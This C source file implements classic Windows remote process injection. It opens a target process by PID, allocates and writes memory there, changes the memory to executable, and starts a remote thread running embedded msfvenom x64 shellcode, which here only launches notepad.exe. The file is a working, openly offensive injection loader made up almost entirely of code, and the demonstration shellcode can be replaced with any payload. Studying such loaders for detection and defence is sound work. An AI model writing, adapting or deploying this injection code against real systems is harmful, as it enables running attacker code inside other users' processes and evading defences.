#include <Windows.h>
#include <stdio.h>

void RemoteProcessInjection(unsigned char payload[], SIZE_T payload_size, int pid) {

	unsigned long old_protection = 0;
	DWORD dwThreadId = 0;

	// open handle to target process
	// https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("[-] Couldn't open the process: %d \n", GetLastError());
		exit(-1);
	}

	// Allocate memory in the remote process
	LPVOID baseAddr = VirtualAllocEx(hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (baseAddr == NULL){
		printf("[-] Failed to allocate memory in remote process: %d \n",GetLastError());
		exit(-1);
	}
	else {
		printf("[+] Allocated memory base address: %p \n", baseAddr);
	}
	
	// Write payload to remote process
	BOOL wPayload = WriteProcessMemory(hProcess,baseAddr,payload,payload_size,0);
	if (!wPayload) {
		printf("[-] Failed to write the payload into the remote process: %d", GetLastError());
		exit(-1);
	}

	// Change page permissions to RX
	BOOL vp = VirtualProtectEx(hProcess, baseAddr, payload_size, PAGE_EXECUTE_READ, &old_protection);
	if (!vp) {
		printf("[-] Failed to change the memory page permissions: %d \n", GetLastError());
		exit(-1);
	}
	else {
		printf("[+] Successfully changed the permission to RX: %p \n", baseAddr);
	}

	// Create thread and execute the payload
	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex
	HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)baseAddr, NULL,NULL,NULL,&dwThreadId);
	if (hThread == NULL) {
		printf("[-] Failed to execute the thread: %d \n", GetLastError());
		exit(-1);
	}
	else {
		printf("[+] Successfully execution of the thread: %d \n", hThread);
	}
}

int main(int argc, char** argv) {
	int pid = 0;
	if (argc < 2) {
		printf("[*] ClassicInjection.exe <PID>");
	}
	// Convert String -> Interger
	pid = atoi(argv[1]);

	// Open Notepad
	// msfvenom -p windows/x64/exec CMD="notepad.exe" -f c
	unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
								"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
								"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
								"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
								"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
								"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
								"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
								"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
								"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
								"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
								"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
								"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
								"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
								"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
								"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
								"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
								"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
								"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
								"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
								"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
	
	SIZE_T payload_size = sizeof(payload);
	RemoteProcessInjection(payload,payload_size,pid);
}
